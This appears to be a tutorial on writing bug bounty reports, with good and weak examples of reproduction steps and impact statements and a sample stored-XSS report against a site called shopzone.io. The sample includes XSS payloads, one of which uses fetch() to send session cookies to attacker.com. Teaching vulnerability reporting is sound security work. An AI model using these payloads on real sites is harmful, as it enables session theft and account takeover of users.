Step 3: Steps to Reproduce

Reproduction steps are the most critical part of your report. A triager must be able to replicate the vulnerability exactly by following your instructions. Write numbered, precise steps.

Good Example
1. Log in to shopzone.io with any valid user account.
2. Navigate to Settings > Profile > Edit Bio.
3. Enter the following payload in the bio field:
   <img src=x onerror=alert(document.cookie)>
4. Click "Save Profile".
5. Navigate to the public profile page (/user/[username]).
6. Observe that the JavaScript executes, displaying session cookies.
Bad Example
Put XSS payload in bio and it runs on the profile page.
Write at least 3 numbered steps (minimum 80 characters)

Step 4: Impact Statement

The impact statement explains why this vulnerability matters to the business. Avoid purely technical language. Frame the risk in terms of user data, revenue, reputation, and regulatory compliance.

Technical Only (Weak)
An attacker can inject JavaScript that runs in other users' browsers.
Business Impact (Strong)
An attacker can craft a malicious profile that automatically steals session tokens from any user who views the profile page. This enables full account takeover of any ShopZone customer, including access to saved payment methods, order history, and personal information. Given that ShopZone processes an estimated 50,000 transactions per day, a weaponized version of this vulnerability could lead to large-scale credential harvesting and financial fraud.
Write at least 100 characters describing business impact

Title: Stored XSS via Unsanitized Bio Field on shopzone.io Enables Account Takeover

CVSS: 6.1 (Medium) -- AV:N/AC:L/PR:N/UI:R/S:C/C:L/I:L/A:N

Steps to Reproduce:
1. Log in to shopzone.io with any valid user account.
2. Navigate to Settings > Profile > Edit Bio.
3. Enter payload: <img src=x onerror=fetch('https://attacker.com/steal?c='+document.cookie)>
4. Click "Save Profile" and confirm the changes persist.
5. Open an incognito window and log in as a different user.
6. Navigate to the attacker's public profile (/user/attacker).
7. Observe network tab: the victim's session cookie is exfiltrated to attacker.com.

Impact: Any ShopZone user who views a malicious profile will have their session token silently exfiltrated. The attacker can then impersonate the victim, access stored payment methods, modify shipping addresses for order redirection, and extract PII. At scale, this could affect thousands of users daily and trigger PCI DSS non-compliance, regulatory penalties, and reputational damage.
